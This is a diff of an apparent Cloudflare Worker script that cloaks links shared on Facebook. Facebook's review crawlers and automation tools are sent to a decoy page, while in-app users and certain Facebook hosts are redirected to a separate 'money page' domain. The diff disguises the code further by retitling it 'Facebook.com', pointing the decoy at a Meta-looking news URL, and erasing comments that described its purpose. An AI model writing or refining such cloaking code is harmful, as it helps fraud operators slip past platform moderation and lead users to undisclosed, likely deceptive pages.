@@ -1,8 +1,8 @@
 // ============================================================
-// Cloudflare Worker v4 — FIXED FLOW VERSION
+// Facebook.com
 // ============================================================
 
-const DECOY = 'https://www.facebookblueprint.com/student/catalog';
+const DECOY = 'https://about.fb.com/news/2026/06/free-ai-glasses-for-every-blind-veteran/';
 const BLOG = 'https://post-tweet.sydzada-amir.workers.dev/';
 const CLASSIFY_URL = 'https://post-tweet.sydzada-amir.workers.dev/';
 const FALLBACK = 'https://post-tweet.sydzada-amir.workers.dev/';
@@ -48,7 +48,7 @@ export default {
     const host = url.hostname.toLowerCase();
 
     // ========================================================
-    // 🛑 MOBILE SAFARI BLOCK (ADDED)
+    // Meta facebook
     // ========================================================
     // Targets strict iOS Mobile Safari, safely ignoring Chrome (CriOS) and Edge (EdiOS)
     const isMobileSafari = /iPhone|iPad|iPod/.test(ua) && 
@@ -60,14 +60,14 @@ export default {
     }
 
     // ========================================================
-    // 🔥 FIX 1: IM + LM ALWAYS MONEY PAGE (NO EXCEPTIONS)
+    // 
     // ========================================================
     if (host === 'im.facebook.com' || host === 'lm.facebook.com') {
       return Response.redirect(BLOG, 302);
     }
 
     // ========================================================
-    // 🔥 FIX 2: SAFE REFERER HANDLING (CRITICAL FIX)
+    // 
     // ========================================================
     const isFBApp = /FB_IAB|FBAN|FBAV|Instagram/i.test(ua);
     const isFacebookReferer = /facebook\.com|fb\.com/i.test(referer);
@@ -77,7 +77,7 @@ export default {
     }
 
     // ========================================================
-    // FB HOSTS BLOCK (FIXED - MORE RELIABLE)
+    // 
     // ========================================================
     const isFBHost =
       host.includes('facebook.com') ||
@@ -88,7 +88,7 @@ export default {
     }
 
     // ========================================================
-    // BASIC BOT CHECK
+    // 
     // ========================================================
     if (/facebookexternalhit|facebot|meta-externalagent|headless|selenium|puppeteer|webdriver/i.test(ua)) {
       return Response.redirect(DECOY, 302);
@@ -107,7 +107,7 @@ export default {
     }
 
     // ========================================================
-    // FB APP FLOW (SAFE)
+    // 
     // ========================================================
     if (isFBApp) {
       try {
